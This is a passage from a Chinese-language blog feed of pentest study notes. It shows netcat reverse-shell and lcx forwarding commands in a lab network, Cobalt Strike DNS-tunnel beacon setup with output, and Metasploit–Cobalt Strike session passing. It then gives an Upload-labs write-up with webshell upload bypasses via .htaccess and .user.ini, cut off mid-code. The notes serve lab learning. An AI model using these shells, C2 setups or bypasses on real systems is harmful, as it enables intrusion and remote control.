-e c:\windows\system32\cmd.exe</span><br><span class="line"> </span><br><span class="line">什么时候用正向，什么时候用反向？</span><br><span class="line">这是根据网络情况，如果受害主机可以找到你，就用反向，受害主机找不到你，就用正向。</span><br><span class="line"> </span><br><span class="line">2.多向连接反弹shell-配合转发</span><br><span class="line">环境：kali（76.132）--&gt;webserver（3.31、76.143）--&gt;sqlserver（3.32）</span><br><span class="line"> </span><br><span class="line">反向：</span><br><span class="line">god\Sqlserver：nc 192.168.3.31 2222 -e c:\windows\system32\cmd.exe //把cmd反弹给webserver的2222端口</span><br><span class="line">god\Webserver：lcx.exe -listen 2222 3333 //把自己的2222端口给3333</span><br><span class="line">kali或本机：nc 192.168.76.143 3333 //连接Webserver的3333端口（获取Sqlserver的cmd窗口数据）</span><br><span class="line"></span><br><span class="line">正向：（自己想的，未验证）？？？</span><br><span class="line">kali或本机：nc 192.168.76.143 2222 //连接Webserver的2222端口（获取Sqlserver的cmd窗口数据）</span><br><span class="line">god\Webserver：lcx.exe -listen 2222 3333 //把自己的2222端口给3333</span><br><span class="line">god\Sqlserver：nc 192.168.3.31 3333 -e c:\windows\system32\cmd.exe //把cmd反弹给webserver的3333端口</span><br><span class="line"></span><br><span class="line">思考：正向该怎么操作呢？实战中该怎么选择正向和反向？</span><br><span class="line"> </span><br><span class="line">3.相关netcat主要功能测试</span><br><span class="line">指纹服务：nc -nv 192.168.76.143</span><br><span class="line">端口扫描：nc -v -z 192.168.76.143 1-100</span><br><span class="line">端口监听：nc -lvp xxxx</span><br><span class="line">文件传输：nc -lp 1111 &gt;1.txt | nc -vn xx.xx.x.x 1111 &lt;1.txt -q 1</span><br><span class="line">反弹Shell：见上</span><br></pre></td></tr></table></figure><h2 id="5-5应用层DNS隧道配合CS上线"><a href="#5-5应用层DNS隧道配合CS上线" class="headerlink" title="5.5应用层DNS隧道配合CS上线"></a>5.5应用层DNS隧道配合CS上线</h2><p>应用层是在实战中经常用到的，之前两个层面会经常被防火墙拦截（网络/传输层），下面用DNS隧道来实现 cs上线。<br>cs的监听器对应着后门绑定的协议。常规是用http上线，dns比http速度要慢。当常见协议监听器被拦截时，可以换其他协议上线，其中dns协议上线基本通杀。因为dns是域名解析，这个协议一般都不会被拦截，数据通过dns协议给出去，一般也不会被拦截！<br>我们在生成监听器的时候有个payload，可以选择不同的协议。网上还有插件，还可以有很多其他协议。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">1.Teamserver配置端口53启用-udp</span><br><span class="line"> </span><br><span class="line">2.买一个域名修改解析记录如下：</span><br><span class="line">A记录-&gt;cs主机名-&gt;CS服务器IP</span><br><span class="line">NS记录-&gt;ns1主机名-&gt;上个A记录地址</span><br><span class="line">NS记录-&gt;ns2主机名-&gt;上个A记录地址</span><br><span class="line"> </span><br><span class="line">3.配置DNS监听器内容如下：</span><br><span class="line">ns1.xiaodi8.com</span><br><span class="line">ns2.xiaodi8.com</span><br><span class="line">cs.xiaodi8.com（Stager）</span><br><span class="line"></span><br><span class="line">4.生成后门</span><br><span class="line"><span class="meta">attacks--&gt;</span><span class="bash">packages--&gt;windows executable(s)--&gt;listener选择dns上线</span></span><br><span class="line">勾选--&gt;选择后门生成位置--&gt;生成后门（dns_x.exe）</span><br><span class="line"></span><br><span class="line">5.生成后门执行上线后启用命令：</span><br><span class="line"><span class="meta">beacon&gt;</span><span class="bash"> checkin</span></span><br><span class="line">[] Tasked beacon to checkin</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">beacon&gt;</span><span class="bash"> mode dns-txt</span></span><br><span class="line">[+] data channel set to DNS-TXT</span><br><span class="line">[+] host called home, sent: 8 bytes</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">beacon&gt;</span><span class="bash"> shell whoami</span></span><br><span class="line">[] Tasked beacon to run: whoami</span><br><span class="line">[+] host called home, sent: 53 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">xiaodi-pc\xiaodi</span><br></pre></td></tr></table></figure><h1 id="6-MSF-amp-CobaltStrike联动"><a href="#6-MSF-amp-CobaltStrike联动" class="headerlink" title="6.MSF&amp;CobaltStrike联动"></a>6.MSF&amp;CobaltStrike联动</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> cs-&gt;msf</span></span><br><span class="line">1.CS创建Foreign监听器</span><br><span class="line">2.MSF监听模块设置对应地址端口</span><br><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_http #这个payload要跟CS设置的payload保持一致</span><br><span class="line">set lhost 0.0.0.0 #不设置也行</span><br><span class="line">set lport 4444 #端口需要与cs监听器端口保持一致</span><br><span class="line">exploit</span><br><span class="line">3.CS执行Spawn选择Foreign监听器</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> msf-&gt;cs</span></span><br><span class="line">1.CS创建Beacon监听器</span><br><span class="line">2.MSF监听模块设置对应地址端口</span><br><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line">set payload windows/meterpreter/reverse_http # 与CS监听器 一致</span><br><span class="line">set lport 5566 # 端口需要与cs监听器 一致</span><br><span class="line">set lhost 101.37.160.211 # IP设置为msf本地IP，与CS设置保持一致</span><br><span class="line">set session 4 # 选择会话</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-基本认识&quot;&gt;&lt;a href=&quot;#1-基本认识&quot; class=&quot;headerlink&quot; title=&quot;1.基本认识&quot;&gt;&lt;/a&gt;1.基本认识&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8.assets/</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Upload-labs Pass01-11</title>
    <link href="http://example.com/2021/12/22/Upload-labs%20Pass01-11/"/>
    <id>http://example.com/2021/12/22/Upload-labs%20Pass01-11/</id>
    <published>2021-12-22T05:45:52.000Z</published>
    <updated>2022-01-13T08:54:09.030Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-Pass-01-前端验证之JS绕过"><a href="#1-Pass-01-前端验证之JS绕过" class="headerlink" title="1.Pass-01 前端验证之JS绕过"></a>1.Pass-01 前端验证之JS绕过</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源码中验证方式是：前端JS验证<br>允许上传的类型为：<code>.jpg|.png|.gif</code>，所以将本地 webshell.php 文件改为 webshell.jpg ，然后通过 burp再将 webshell.jpg改回 webshell.php<br>![image.png](Upload-labs Pass01-11.assets/78cj8s.png)<br>![image.png](Upload-labs Pass01-11.assets/aqgu7s.png)</p><h1 id="2-Pass-02-MIME绕过"><a href="#2-Pass-02-MIME绕过" class="headerlink" title="2.Pass-02 MIME绕过"></a>2.Pass-02 MIME绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || </span><br><span class="line">    (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || </span><br><span class="line">    (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>))</span><br><span class="line">  <span class="comment">//文件类型必须是image/jpeg,image/png或者image/gif中的一种才能执行上传操作</span></span><br></pre></td></tr></table></figure><p>源码中验证方式是：上传文件的type值<br>通过burp抓包，将文件的type值改为image/jpeg<br>![image.png](Upload-labs Pass01-11.assets/i1q6y6.png)<br>![image.png](Upload-labs Pass01-11.assets/ljeh2n.png)</p><h1 id="3-Pass-03-上传特殊可解析后缀"><a href="#3-Pass-03-上传特殊可解析后缀" class="headerlink" title="3.Pass-03 上传特殊可解析后缀"></a>3.Pass-03 上传特殊可解析后缀</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br></pre></td></tr></table></figure><p>源码中验证方式是：<br>获取文件名<br>移除字符串两侧的空白字符<br>删除文件名末尾的点<br>返回从”<code>.</code>“该位置到字符串结尾的所有字符<br>将后缀转换为小写<br>去除后缀中的字符串：<code>::$DATA</code><br>最后再进行首尾去空<br>然后对比后缀是否不在<code>deny_ext</code>中<br>​</p><p>上传其他可解析的后缀名进行绕过，将wehshell.php后缀名改为php5<br>​</p><h1 id="4-Pass-04-上传-htaccess解析"><a href="#4-Pass-04-上传-htaccess解析" class="headerlink" title="4.Pass-04 上传.htaccess解析"></a>4.Pass-04 上传.htaccess解析</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">       <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">       <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">       <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">       <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">       <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">       <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br></pre></td></tr></table></figure><p>源码中验证方式是：<br>获取文件名<br>移除字符串两侧的空白字符<br>删除文件名末尾的点<br>返回从”<code>.</code>“该位置到字符串结尾的所有字符<br>将后缀转换为小写<br>去除后缀中的字符串：<code>::$DATA</code><br>最后再进行首尾去空<br>然后对比后缀是否不在<code>deny_ext</code>中</p><p>由于此处的<code>deny_ext</code>数组太大，此处上传<code>.htaccess</code>文件，通过在此文件中加入php自定义解析规则，然后在上传自定义解析规则的文件。<br>ps：<code>.htaccess</code>只是适用于apache，如果变成niginx或者iis则不会被解析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;aaa&quot;</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>上传成功后，以aaa为名的文件会被解析为php文件执行</p><h1 id="5-Pass-05-后缀大小写绕过"><a href="#5-Pass-05-后缀大小写绕过" class="headerlink" title="5.Pass-05 后缀大小写绕过"></a>5.Pass-05 后缀大小写绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.user.ini文件预备知识：</span><br><span class="line"></span><br><span class="line">使用条件：</span><br><span class="line">(1)服务器脚本语言为PHP</span><br><span class="line">(2)对应目录下面有可执行的php文件</span><br><span class="line">(3)服务器使用CGI／FastCGI模式</span><br><span class="line">.user.ini.它比.htaccess用的更广，不管是nginx/apache/IIS，</span><br><span class="line">只要是以fastcgi运行的php都可以用这个方法。</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此处的黑名单相比下关来说少了<code>.user.ini</code>，于是上传<code>.user.ini</code>文件然后在文件中输入：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto<span class="emphasis">_prepend_</span>file=webshell.jpg</span><br></pre></td></tr></table></figure><p>.user.ini文件里的意思是：<br>所有的php文件都自动包含webshell.jpg文件。.user.ini相当于一个用户自定义的php.ini<br>然后上传包含一句话的webshell.jpg，之后访问readme.php完成本关。</p><h1 id="6-Pass-06-后缀大小写绕过"><a href="#6-Pass-06-后缀大小写绕过" class="headerlink" title="6.Pass-06 后缀大小写绕过"></a>6.Pass-06 后缀大小写绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空</span></span><br></pre></td></tr></table></figure><p>此处相比之前代码中少了后缀转化为小写，此处虽然有一些大写后缀的黑名单，但是不全，所以此处可用后缀大小写绕过。<br>​</p><p>将webshell.php文件后缀改为PHp后上传完成本关。<br>​</p><h1 id="7-Pass-07-空格绕过"><a href="#7-Pass-07-空格绕过" class="headerlink" title="7.Pass-07 空格绕过"></a>7.Pass-07 空格绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);        <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span></span><br></pre></td></tr></table></figure><p>相比完整的验证代码，此处少了首尾去空的代码。<br>​</p><p>通过burp抓包，在文件后缀后门加上空格，完成本次的绕过。<br>![image.png](Upload-labs Pass01-11.assets/b38npm.png)</p><h1 id="8-Pass-08-点绕过"><a href="#8-Pass-08-点绕过" class="headerlink" title="8.Pass-08 点绕过"></a>8.Pass-08 点绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span 